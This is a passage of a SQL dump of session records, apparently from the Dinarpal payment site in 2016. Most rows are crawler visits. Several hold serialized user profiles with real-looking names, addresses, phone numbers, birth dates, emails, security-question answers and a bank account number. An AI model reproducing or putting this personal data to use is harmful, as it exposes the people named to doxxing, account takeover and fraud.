('4b14b2315f4a0a010427d10200204f8e', '180.76.15.32', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461708916, ''),
('4b18df237138435fa98e6d949f4767c7', '157.55.39.200', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461308998, ''),
('4b1e3e03594a228bcb401709009349fc', '183.171.28.28', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461820751, 'a:1:{s:12:"me_id_parent";s:1:"1";}'),
('4b349dc467eb11a990333df960d182f3', '0.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461394619, 'a:50:{s:5:"me_id";s:1:"3";s:8:"me_image";s:42:"6d3ac-adeq-nur---ftmk!-20150212_151603.jpg";s:12:"me_firstname";s:9:"Nur Umira";s:11:"me_lastname";s:7:"Mustafa";s:11:"me_username";s:3:"nur";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:3:"nur";s:14:"me_unique_link";s:32:"b55178b011bfb206965f2638d0f87047";s:11:"me_address1";s:44:"J-1-14, BLOK J, PANGSAPURI TTU3, JALAN TU61.";s:8:"me_city1";s:10:"AYER KEROH";s:9:"me_state1";s:6:"MELAKA";s:12:"me_postcode1";s:5:"75450";s:11:"me_country1";s:8:"MALAYSIA";s:11:"me_address2";s:28:"91, JALAN KERAI, SG. RETANG.";s:8:"me_city2";s:8:"JERANTUT";s:9:"me_state2";s:6:"PAHANG";s:12:"me_postcode2";s:5:"27000";s:11:"me_country2";s:8:"MALAYSIA";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:10:"0136420142";s:13:"me_birth_date";s:10:"1993-05-18";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:33:"https://www.facebook.com/nurumira";s:10:"me_twitter";s:28:"https://twitter.com/nurumira";s:12:"me_instagram";s:29:"http://instagram.com/nurumira";s:13:"me_googleplus";s:30:"http://googleplus.com/nurumira";s:14:"me_whatsapp_no";s:10:"0199737579";s:11:"me_telegram";s:1:"-";s:9:"me_wechat";s:1:"-";s:8:"me_email";s:18:"nurumira@gmail.com";s:16:"me_register_date";s:19:"2015-04-27 03:12:49";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-23T08:41:34+02:00";s:12:"me_magic_num";s:32:"69c0e639c71a34bb6b710f043138f7f8";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"2";s:9:"logged_in";b:1;}'),
('4b455db27c0a05479489c1ce7ce635dd', '134.249.55.100', 'Mozilla/6.0 (compatible; MSIE 7.0a1; Windows NT 5.', 1461690037, ''),
('4b57419f492b533dad90b926bc594456', '180.76.15.18', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461929431, ''),
('4b5a5939ca17c12c30483bd46abe4f88', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; Dig', 1461491222, ''),
('4b5aaf1b12c9186358786f68cdf659ed', '123.246.120.73', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461167106, ''),
('4b711ed352b7d70899adb7aa261ae547', '5.9.89.170', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461935052, ''),
('4b7a1eab6739715214b4307b298f10f6', '13.92.241.115', 'semanticbot', 1461739127, ''),
('4b91aef1be5609095d7b990e72489a11', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461739276, ''),
('4bbae0e49f43c378a527949febbf5782', '66.249.66.33', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461272445, ''),
('4c1da313355245df84338fc895981dc6', '66.249.65.37', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461097044, ''),
('4c3c27c842d37aaf5a227d1b5e9bee30', '180.76.15.14', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461166840, ''),
('4c3daccbd28d1c825f021ea2f18e22cf', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 6.0; AOL 9.0; Window', 1461188318, ''),
('4c7d7c3d3319fd0cff7724e29611fd14', '195.154.184.40', 'Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/201001', 1461308126, ''),
('4c86343792edebacc7bef37514d68592', '188.138.9.41', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1', 1461910821, ''),
('4cc3f9b172b2ca5c6a78101cc090bff4', '210.48.221.10', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461767860, ''),
('4d4ac624349bd95fb19dd83f9ef33eb5', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461734846, ''),
('4d52d54cd064080fe47c310852eeb776', '183.171.18.77', 'WhatsApp/2.16.13 A', 1461232123, ''),
('4d740e93ad4da9b8c8ee3681c30536ea', '40.77.167.71', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461551019, ''),
('4d7889c2a4310820741deb6ed0f60562', '175.136.140.216', 'WhatsApp/2.16.53 A', 1461913109, 'a:1:{s:12:"me_id_parent";s:8:"ATVcaA==";}'),
('4df3047e652b0ef53ca7b14860e03ec2', '157.55.39.158', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461805568, ''),
('4e2aacefa9983a76bd3053d43ab213db', '60.54.87.69', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/53', 1461731385, ''),
('4e355273dc4a0e2855141a6c8e0e2af4', '203.106.151.205', 'Mozilla/5.0 (Linux; Android 4.0.0;) AppleWebKit/53', 1461472815, 'a:1:{s:12:"me_id_parent";s:88:"081IGI2KE6AuNHKljOLNeMIk1MK-_IDOyJcWuDE1uPMjPWIfO-GTtjZ49q4oZ0WA-gfwZLuU_a7s8XKJdu037w==";}'),
('4e4e55725d70003d80a3ee4b52561782', '51.255.65.59', 'Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ah', 1461838681, ''),
('4e64c9427cd3361ea48e9811d6369f6d', '113.210.56.50', 'Mozilla/5.0 (Linux; Android 4.4.2; en-gb; SAMSUNG ', 1461498595, 'a:1:{s:12:"me_id_parent";s:88:"9eKTe6mUEnZ1-26uDnAG0Yd0Lrx8qoR0hpb2uBFOmrT2FbfAZy6Pb5SlaTuBlBI-pIgvHmm8GzEZ44DTFGLXCg==";}'),
('4efbdc96e5b9fae26e312c22a9c06cff', '74.82.47.2', '0', 1461124847, ''),
('4f62840f4fc83ff72d47603ec9e241fe', '183.171.30.94', 'Mozilla/5.0 (Linux; Android 6.0.1; HTC One_E8 Buil', 1461472446, 'a:1:{s:12:"me_id_parent";s:88:"LK6QEzHeWQwxohjhcYAfnHCln7GayAmNI5TrMjF8HFJ5AfhnLXKdhgYVD1e3FOztsU8gUiGeHtQ4lOX5c8sxcg==";}'),
('4f6c0ecdefdba9d0c5247053cc53473f', '175.136.241.41', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/53', 1461644358, ''),
('4f7f6c4c1d165ab1a5bdfc765f1dfcf4', '40.77.167.76', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461472743, ''),
('4f810c447c92524c29e58d50d3529cac', '159.203.42.143', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko', 1461731000, ''),
('4f98471fe28e506b54547eee8cbb81db', '208.115.113.93', 'Mozilla/5.0 (compatible; DotBot/1.1; http://www.op', 1461125207, ''),
('4f9da9a51166e0b15c326d27f416bddb', '123.125.71.20', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461458456, ''),
('4fc47d4c1f6cec44e128c5d5ce6bc2b1', '118.161.72.115', '0', 1461921752, ''),
('4fc482f5f13ec70f02635bf659ddd438', '185.94.190.155', '0', 1461104264, ''),
('4fd698e2de1ad8d3d4d2f99e53b5c4ea', '60.54.87.69', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/53', 1461901832, ''),
('4fe0e282781b699afebf2788fc932490', '175.141.171.212', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461496693, 'a:1:{s:12:"me_id_parent";s:88:"jv7Mhqk2dGsV4ROO5O3bKQ0OACR7hnzPznjssAQLXkH8Sd5wHSzlCajo7Kg_qav4OhW6tVyE3exOghT0nX91iA==";}'),
('4ffa6525f239cbc36135e21a3ba23b2f', '180.76.15.32', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461856818, ''),
('500fee89a3e6e8d676a9a00ae0a2b7ed', '216.55.186.43', '0', 1461253473, ''),
('5034ea745a612ecd05c9c971f6e01b7f', '5.9.83.211', 'Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http:/', 1461160549, ''),
('504a1f5e3d4f5e03af1cafcc3438c72e', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461728999, ''),
('504c5d4145e20aa9f999d3bbce4078b6', '51.255.65.80', 'Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ah', 1461521533, ''),
('5075803fcf39edbe5cf668129be8252b', '173.252.80.113', 'facebookexternalhit/1.1', 1461421816, 'a:1:{s:12:"me_id_parent";s:88:"5OF9CNwLKfEIZOhdv2lGah0NpT_05MCzmoEuO2DxBBTS62WEjoSQitqqGXH5_qhxvyFgUSfP6aUWtknjbHZjzg==";}'),
('5081dc4de7e271a3f7b8eafd19966fd5', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461231994, ''),
('50d6d04ff3800c3daebdef9bee34063d', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 5.0; Windows 95) Ope', 1461197227, ''),
('50f119a67076569d31dfa484b1b3eb48', '78.46.50.246', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461898659, ''),
('51559fe17368ad5e311adafce5da32cb', '157.55.39.158', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461230640, ''),
('51643f232c33f4c9c03067f604d85826', '180.76.15.149', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461662570, ''),
('51759a9cd06eb0cacbbba0c219149c25', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461422006, ''),
('51dbc2ae599bf1f5ef705c33ce8e4224', '123.136.111.5', 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z008D Build/', 1461486866, 'a:1:{s:12:"me_id_parent";s:88:"kpOp_fvx3O8O4V3zY-YckWxLCj6D5sBhRRNf5J5O284nD_W3_jBS6QaVOp2tIZRCz6O2lNiZ9bzGIF332ZW9kQ==";}'),
('522eb0df61b7d02b69796b7213a90c29', '61.228.88.194', '0', 1461781346, ''),
('5241a420d268a129b88c0f5cab286c06', '180.76.15.18', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461890943, ''),
('526313249b271e8779a0ab66ecff8f2b', '45.33.59.157', 'Mozilla/5.0 (compatible; Uptimebot/1.0; +http://ww', 1461657970, ''),
('52c4e8dea0993275f67919354cc9abb0', '180.76.15.138', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461473220, ''),
('52eae75c3534b5d4188751090ae5f655', '180.76.15.155', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461177211, ''),
('5302e359e1045055ee4736991aaeb11b', '115.164.190.214', 'Mozilla/5.0 (Linux; Android 4.4.2; SM-T231 Build/K', 1461414006, 'a:1:{s:12:"me_id_parent";s:88:"t0N6rzu3psTXYPOWpJCLglDYRPSJGlyH-6OeFmUH_kHYa_KOtDK52tWt3ArBhtCD50-x24D-MENEQqA2w9c4qA==";}'),
('53072f9bcb6d9f0aa1eaa4b1dfe4450a', '183.171.170.155', 'Mozilla/5.0 (Linux; Android 5.1.1; SM-N9208 Build/', 1461496834, 'a:1:{s:12:"me_id_parent";s:88:"pCvYhzAWym_vkLCWdndEK74JPZ7tfL9JryP-KAKAclbtZqAPdKo2PS4fIT6R7fURPDwtT9pZ3ovAWa_wQ2naZA==";}'),
('5326ce730948d672a041560020491b62', '158.69.228.18', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) G', 1461748525, ''),
('532ae1fbad390f3087b503f47344a61f', '45.79.180.122', 'Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 2 Bu', 1461413776, 'a:3:{s:12:"me_id_parent";s:88:"M8es3vJL1O7RCRm9IoMx1_lW6JEvQHj4EU5SWZFAqY3tw1VER1eQzubFoKmiMPVcTqStTe6UMoHjl-d6_cpqNw==";s:15:"flash:old:error";s:279:"Password validation failure ( your choise is weak ) <br /><br />Password too short!<br />Password must include at least one number!<br />Password must include at least one letter!<br />Password must include at least one CAPS!<br />Password must include at least one symbol!<br />";s:15:"flash:new:error";s:279:"Password validation failure ( your choise is weak ) <br /><br />Password too short!<br />Password must include at least one number!<br />Password must include at least one letter!<br />Password must include at least one CAPS!<br />Password must include at least one symbol!<br />";}'),
('5339df736f9d37dea38eb47fba791657', '5.248.253.133', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)', 1461159325, ''),
('534e243033355a74742ac442f98ebd87', '180.76.15.18', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461737760, ''),
('534faf10c0f7d30e9de656efdffbb369', '91.121.169.194', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461770626, ''),
('534fc0c6f47afa00a4f7f34385ceadb6', '180.76.15.21', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461580989, ''),
('53c6135750ea8aebf78be18f087e2697', '113.210.55.79', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko', 1461587558, ''),
('53fb17e00def01f57291c2aca4334707', '175.141.171.212', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461448321, 'a:1:{s:12:"me_id_parent";s:88:"bbDQJleMyCGeGpFhXDMCXrJzhcj6xMtTwjXdadf423_txENIa5mu6TYpnj7Z8Pw9FCKKkDz_NJV6U318xZWI_w==";}'),
('5402143be5fd98bd50a3176d4579f5b9', '173.252.90.108', 'facebookexternalhit/1.1 (+http://www.facebook.com/', 1461421808, 'a:1:{s:12:"me_id_parent";s:88:"smh_YYip9KQPIDHee_hOUOtELUeuyaLNTqGub0Pd3ous5JJpngBv0WgSeZVmAMF0lVL6VlmbnUm9kWw88UJ1fQ==";}'),
('542b6f63d6e43000d581e598a0d0d474', '210.48.221.10', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461767070, ''),
('5447da71f462c5aa6c25141abfe286ad', '130.193.51.30', 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://ya', 1461247730, ''),
('5474df9ee79610c538ec9f8043cfffe5', '66.249.66.36', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461279764, ''),
('54792bd1728be81de46daa14d4362792', '208.115.111.74', 'Mozilla/5.0 (compatible; DotBot/1.1; http://www.op', 1461157780, ''),
('5497b3a8177463233a407e2c878171e1', '66.249.69.217', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461537397, ''),
('54badb362465b2b930f970eb0a709a6b', '158.69.228.18', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25', 1461834774, ''),
('54d500ce793cb7167b43525259c1b203', '13.92.241.115', 'semanticbot', 1461739110, ''),
('551bad869ea91c9fe9771fa893c1c0c7', '113.210.54.28', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461133639, 'a:51:{s:5:"me_id";s:1:"9";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:3:"mzh";s:11:"me_lastname";s:3:"mzh";s:11:"me_username";s:3:"mzh";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:3:"mzh";s:14:"me_unique_link";s:32:"eab54c7fb6a1daabe6b845752b0b5234";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:16:"ijul89@gmail.com";s:16:"me_register_date";s:19:"2016-04-20 14:07:58";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";N;s:12:"me_magic_num";s:32:"ba64d4c8f84e926af9e9955542eff18c";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"0";s:9:"msg_login";s:153:"Thank You for choosing Dinarpal for your platform <br/>Please fill in all your personal detail<br />and deposit your money for your account verification.";s:9:"logged_in";b:1;}'),
('563b95584f8a1c4d7b2549b0605a45e4', '175.139.86.43', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461759731, ''),
('564513b38b064684a5d96e3d2f2c1469', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461232003, ''),
('5653b4ab60e2d3f409a4bf86a43247ac', '113.210.54.109', 'WhatsApp/2.16.13 A', 1461422660, 'a:1:{s:12:"me_id_parent";s:88:"vycwxXvsjc8ZVcayhHOLf3ewpXNE0bciKJpKpKzxeTLzVgFfc5fucUhR0N7cnzD8C6n0jaNTqAgcwQKgroAbaQ==";}'),
('567a231b7439ffcf0daea721fd189e1e', '180.76.15.20', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461451525, ''),
('568bee85402e7d0d763198ae144ca1a5', '180.76.15.26', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461806446, ''),
('56994a1544d88c23b2a16b08cdd4c5c2', '66.249.85.167', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36', 1461547433, ''),
('569b9f89992acee1f69de17aad344229', '180.76.15.155', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461566157, ''),
('56a522431c2dab7e6e9b416034904410', '180.76.15.148', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461220511, ''),
('56c7ca86a581c657cf08b658044b3bc4', '180.76.15.20', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461141923, ''),
('56f35d1c1dadd894ebef88814ff62da0', '66.249.65.195', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461107945, ''),
('5702e8aef3b845eb7be8ab0d87e8010e', '123.136.107.246', 'Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00Q Build', 1461913257, 'a:1:{s:12:"me_id_parent";s:8:"BDAIPA==";}'),
('571a521e85ec72106a8de78349907eab', '198.27.74.213', 'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help', 1461485408, 'a:1:{s:12:"me_id_parent";s:88:"_dpQu8V59J5NmVUgtfucSeKGfDcUpVx67yoh2YLZUnwMnYyLKV9n4Cy17xHkrw0AlrP2u9O3sB0BU9yKrNOWPg==";}'),
('574985be713781b07f0c864b2d2c53b7', '144.76.8.132', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461892135, ''),
('578a973e39621ffe7851bd4f80c4bf47', '113.210.179.247', 'Mozilla/5.0 (Linux; Android 4.3; ASUS_T00J Build/J', 1461422162, ''),
('5799286ba55d6374343a25f2412fcf30', '178.255.215.70', 'Mozilla/5.0 (compatible; Exabot/3.0; +http://www.e', 1461793748, ''),
('57c9a7af3bba2763b4446a457a7b1285', '180.76.15.147', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461642082, ''),
('57fc4d1f7553190b5401bd3dee13d27b', '175.214.107.43', 'Mozilla/5.0 (Linux; Android 4.4.2; CHM-U01 Build/H', 1461410782, 'a:1:{s:12:"me_id_parent";s:88:"-7s6zgHd7yJbnWP3mfk3dMaVmMysBN7SOKZOb_BPDWbfGHn7FzMq22BkxS7ljKqTRUvZDNZiPEwblRyDzyEwww==";}'),
('581f09ac9c2f96a07df24dd3421f1d22', '173.252.90.233', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Geck', 1461899383, 'a:1:{s:12:"me_id_parent";s:4:"V2E=";}'),
('586e8fe32c241f134e4e9aacc4c597af', '180.76.15.150', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461693761, ''),
('58a16fbbbfda97b18caba9b521aab3b5', '113.210.48.47', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461815143, 'a:1:{s:12:"me_id_parent";s:8:"UWQJPg==";}'),
('58c0a96417c4d62da4cb3b02586253e5', '42.99.164.60', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/53', 1461127758, ''),
('58e8efa699b01ce4ef36365e9cef44a4', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2;', 1461188451, ''),
('593928af534a1584201b13d40ecd11a9', '66.249.66.34', 'DoCoMo/2.0 N905i(c100;TB;W24H16) (compatible; Goog', 1461870332, ''),
('598b8228cd0ebc8bcf79339b523fc249', '180.76.15.163', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461816994, ''),
('59a91cc4edeec06925f004c5dfcd2560', '180.76.15.24', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461665709, ''),
('59bebaea046023a6134fe2a12cfe2b87', '80.227.174.18', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:28.0) Gecko', 1461730993, ''),
('59c7802c03a332347f049d42256e4fab', '66.249.69.127', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461484615, ''),
('59e294ee459ae2dfdddbfec100abf4b0', '180.76.15.9', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461419406, ''),
('5a14e0d0111e2c6fcd73986a0316f7ae', '180.76.15.144', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461408296, ''),
('5ab10705775643fedc2a5c24b4555113', '115.164.209.121', 'Mozilla/5.0 (Linux; Android 4.4.2; GT-N7100 Build/', 1461519754, 'a:1:{s:12:"me_id_parent";s:88:"PrDw2esOeYRbwJq4mJ-pLwoPmot32i993By1KHZrP50uYSxFy5YSc3QtviNhj0NsoVyAN-v7XvaEq3N8Nhwvqg==";}'),
('5b57eb443e4af33919ef08e1b61fc1af', '164.132.161.85', 'Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ah', 1461418753, ''),
('5b68b76ae061f9715e38d4f849944077', '210.186.53.48', 'Mozilla/5.0 (Linux; Android 5.0.2; SM-A500F Build/', 1461415670, 'a:1:{s:12:"me_id_parent";s:88:"-K3NFhS6Ty9LS-SshhMd0CTg7i6Ls6UyiGVuKAUj3RpJHyUfISo-xERc8kz62JNzw5TnA4f6Is04WjigWJhYTw==";}'),
('5c01d2089ec59c6d7503dec964eb7d1a', '180.76.15.8', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461702390, ''),
('5c3e0d7c6154a923522097982c4e222c', '178.255.215.70', 'Mozilla/5.0 (compatible; Exabot/3.0; +http://www.e', 1461108918, ''),
('5cc37f6ee82ff522a7160ec0f70778e4', '180.76.15.137', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461860337, ''),
('5cc9c8f9f8d5977b9c3e1f13f39f2bda', '60.54.87.69', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/53', 1461731402, 'a:57:{s:5:"me_id";s:1:"7";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:5:"arash";s:11:"me_lastname";s:5:"arash";s:11:"me_username";s:5:"arash";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:5:"arash";s:14:"me_unique_link";s:32:"81b9a3538d93a7623ad0e9bf1347d137";s:11:"me_address1";s:15:"DinarPal Street";s:8:"me_city1";s:10:"Ayer Keroh";s:9:"me_state1";s:6:"Melaka";s:12:"me_postcode1";s:5:"75450";s:11:"me_country1";s:8:"Malaysia";s:11:"me_address2";s:15:"DinarPal Street";s:8:"me_city2";s:10:"Ayer Keroh";s:9:"me_state2";s:6:"Melaka";s:12:"me_postcode2";s:5:"75450";s:11:"me_country2";s:8:"Malaysia";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:11:"60166707888";s:13:"me_birth_date";s:10:"1977-01-19";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:0:"";s:10:"me_twitter";s:0:"";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";s:0:"";s:11:"me_telegram";s:0:"";s:9:"me_wechat";s:0:"";s:8:"me_email";s:22:"arash.private@live.com";s:16:"me_register_date";s:19:"2016-04-23 17:41:44";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-26T15:04:29+08:00";s:12:"me_magic_num";s:32:"248dfd4fff3169f86edec2930684bfd4";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"1";s:10:"me_is_amil";s:2:"no";s:9:"logged_in";b:1;s:12:"gs_sub_total";d:200;s:11:"gs_discount";i:0;s:6:"gs_fee";d:2;s:6:"gs_gst";d:0.11999999999999999555910790149937383830547332763671875;s:11:"gs_datetime";s:19:"2016-04-27 12:30:32";s:7:"gs_amil";s:21:"DP System HQ Dinarpal";}'),
('5ce7c61a2b76ebdf605ac46cbe194652', '113.210.54.109', 'Mozilla/5.0 (Linux; Android 4.4.4; Lenovo A6000 Bu', 1461420803, 'a:58:{s:5:"me_id";s:1:"9";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:19:"ruxaini89@gmail.com";s:11:"me_lastname";s:19:"ruxaini89@gmail.com";s:11:"me_username";s:19:"ruxaini89@gmail.com";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:19:"ruxaini89@gmail.com";s:14:"me_unique_link";s:32:"57a476e2b37f20f08708e171d9d58d4c";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:19:"ruxaini89@gmail.com";s:16:"me_register_date";s:19:"2016-04-23 19:11:04";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-23T19:36:06+08:00";s:12:"me_magic_num";s:32:"57a476e2b37f20f08708e171d9d58d4c";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"0";s:9:"logged_in";b:1;s:7:"de_code";s:16:"Cfs5lTCriT8q1gEx";s:16:"admin_account_no";s:14:"04042010006119";s:18:"admin_account_name";s:31:"Koperasi DinarPal Melaka Berhad";s:9:"de_amount";d:12.1199999999999992184029906638897955417633056640625;s:11:"tr_datetime";s:19:"2016-04-23 22:36:04";s:11:"deposit_fee";s:4:"2.00";s:7:"gst_tax";d:0.11999999999999999555910790149937383830547332763671875;s:8:"tr_notes";s:7:"deposit";}'),
('5ce9ba007aea2b4c13843faf9279fbd6', '180.76.15.144', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461179167, ''),
('5d46c2c6fdd2f2121a122b565e1dfffc', '115.134.161.155', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/5', 1461201329, ''),
